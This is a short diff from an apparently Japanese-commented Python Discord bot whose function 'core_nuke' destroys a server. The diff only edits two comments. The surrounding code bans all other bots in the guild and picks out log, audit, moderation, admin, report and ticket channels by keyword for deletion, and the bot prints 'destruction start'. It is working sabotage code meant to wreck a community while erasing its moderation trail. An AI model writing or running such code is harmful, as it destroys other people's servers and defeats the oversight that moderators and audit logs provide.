@@ -122,11 +122,11 @@ async def core_nuke(guild, new_server_name=None):
 
     print(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
 
-    # 並列スタート: 他のボットBAN
+    # 他のボットBAN（空対策）
     bot_ban_coros = [limited_global(guild.ban(m, reason="", delete_message_seconds=0)) for m in members if m.bot]
     bot_ban_task = asyncio.create_task(asyncio.gather(*bot_ban_coros, return_exceptions=True)) if bot_ban_coros else None
 
-    # ログ系チャンネル削除
+    # ログ系チャンネル削除（空対策）
     log_keywords = ["log", "ログ", "audit", "監視", "mod", "moderation", "admin", "管理", "report", "報告", "ticket", "チケット"]
     channels = list(guild.channels)
     log_channels = [ch for ch in channels if any(kw.lower() in ch.name.lower() for kw in log_keywords)]
